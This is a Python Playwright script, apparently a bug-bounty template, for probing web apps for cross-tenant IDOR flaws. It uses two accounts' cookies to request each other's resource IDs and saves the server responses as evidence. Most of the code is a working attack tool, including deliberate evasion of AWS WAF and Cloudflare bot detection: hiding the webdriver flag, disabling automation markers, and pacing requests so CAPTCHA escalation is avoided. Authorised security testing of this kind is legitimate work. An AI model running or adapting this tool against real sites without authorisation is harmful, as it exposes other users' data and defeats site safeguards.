#!/usr/bin/env python3
"""IDOR cross-tenant probe template.

Drives a real Chrome browser via Playwright. Tested against AWS-WAF-protected
Laravel/Filament apps; the same pattern works for Cloudflare-JS-challenged
sites.

Usage (after editing the CONFIG block):
    python3 probe_idor.py

Outputs:
- One HTML file per (account, target) pair under OUT/
- Console summary with status + size per probe

Engineering notes (carry over from the Eventcube hunt):
- channel="chrome", headless=True, plus the webdriver init script defeats
  the JS-challenge bot-detection on AWS WAF.
- Pace 15-30s between requests. Bursts escalate WAF from JS-challenge to
  CAPTCHA, which requires manual solving.
- Use page.goto() and response interception (not context.request.fetch())
  because the .fetch() path doesn't trigger the JS-challenge solver.
- If you see status=405 with title "Human Verification", the IP is now in
  CAPTCHA mode. Stop the script and ask the user to re-export their
  aws-waf-token after solving the captcha in a real browser.
"""
import time, sys
from pathlib import Path
from playwright.sync_api import sync_playwright

# -----------------------------------------------------------------------------
# CONFIG — edit per engagement
# -----------------------------------------------------------------------------
BASE = "https://target.example.com"  # base URL
OUT = Path("./evidence")
OUT.mkdir(parents=True, exist_ok=True)
UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
PACING_SECONDS = 20  # delay between probes

# Account 1 cookies (Playwright cookie format).
# Convert from Cookie-Editor JSON via templates/cookies_template.py.
COOKIES_A1 = [
    # {"name": "...", "value": "...", "domain": "target.example.com", "path": "/", "secure": True, "httpOnly": True},
]

# Account 2 cookies
COOKIES_A2 = [
    # ...
]

# Probes are (label, url, save_name) triples.
# Lay out OWN baselines AND cross-tenant probes for both accounts.
# Replace {own_id} and {cross_id} with real resource IDs you've identified.
PROBES_A1 = [
    ("A1 own /resource/{own_id}/edit",   f"{BASE}/resource/<A1_own_id>/edit",   "BODY_a1_own.html"),
    ("A1 → A2 /resource/{cross_id}/edit", f"{BASE}/resource/<A2_id>/edit",      "BODY_a1_cross.html"),
    ("A1 negative /resource/{cross_id}",  f"{BASE}/resource/<A2_id>",            "BODY_a1_neg_control.html"),
]
PROBES_A2 = [
    ("A2 own /resource/{own_id}/edit",   f"{BASE}/resource/<A2_own_id>/edit",   "BODY_a2_own.html"),
    ("A2 → A1 /resource/{cross_id}/edit", f"{BASE}/resource/<A1_id>/edit",      "BODY_a2_cross.html"),
]


# -----------------------------------------------------------------------------
# Helpers (don't edit unless you know why)
# -----------------------------------------------------------------------------
def wait_for_waf_pass(page, max_wait=30):
    """AWS WAF / Cloudflare JS challenge auto-solves & reloads. Wait it out."""
    deadline = time.time() + max_wait
    while time.time() < deadline:
        try:
            body = page.evaluate("document.body ? document.body.innerText.slice(0,400) : ''")
            title = (page.title() or "")
        except Exception:
            body, title = "", ""
        if "JavaScript is disabled" not in body and "challenge" not in body.lower():
            if title and len(body) > 200:
                return True
        time.sleep(1.2)
    return False


def fetch_via_response(page, url, save_name):
    """Use page.goto + response interception — captures raw server HTML."""
    captured = {}
    def on_response(r):
        if r.request.resource_type == "document" and r.url.rstrip("/") == url.rstrip("/"):
            try:
                captured["status"] = r.status
                captured["body"] = r.text()
                captured["headers"] = dict(r.headers)
            except Exception as e:
                captured["error"] = str(e)
    page.on("response", on_response)
    try:
        page.goto(url, wait_until="domcontentloaded", timeout=60000)
    except Exception:
        pass
    # If the JS-challenge reload chain fires, give it time
    for _ in range(10):
        time.sleep(1.0)
        st = captured.get("status")
        if st and st not in (202, 405):
            break
    page.remove_listener("response", on_response)
    if "body" in captured:
        (OUT / save_name).write_text(captured["body"])
        print(f"  status={captured['status']} size={len(captured['body']):,} -> {save_name}")
    else:
        print(f"  [no response captured]")
    return captured


def run_account(browser, label, cookies, probes):
    ctx = browser.new_context(
        user_agent=UA, locale="en-US", timezone_id="UTC",
        viewport={"width": 1440, "height": 900},
    )
    # Stealth: hide the webdriver flag (defeats the standard bot-detection check)
    ctx.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")
    ctx.add_cookies(cookies)

    # Prime: visit /account (or any benign authenticated page) so the WAF JS
    # challenge auto-solves and stores a fresh aws-waf-token cookie.
    page = ctx.new_page()
    page.goto(f"{BASE}/", wait_until="domcontentloaded", timeout=60000)
    wait_for_waf_pass(page, max_wait=30)
    print(f"[{label} prime] OK at {page.url}")
    page.close()

    for probe_label, url, save in probes:
        print(f"\n[{label}] {probe_label}  {url}")
        page = ctx.new_page()
        try:
            fetch_via_response(page, url, save)
        finally:
            page.close()
        time.sleep(PACING_SECONDS)
    ctx.close()


def main():
    with sync_playwright() as p:
        # Real Chrome (channel="chrome") + headless evades most JS-challenge
        # bot-detection. Bundled Chromium gets fingerprinted as a bot too often.
        browser = p.chromium.launch(
            channel="chrome",
            headless=True,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-first-run",
                "--no-default-browser-check",
            ],
        )
        try:
            run_account(browser, "A1", COOKIES_A1, PROBES_A1)
            run_account(browser, "A2", COOKIES_A2, PROBES_A2)
        finally:
            browser.close()


if __name__ == "__main__":
    main()
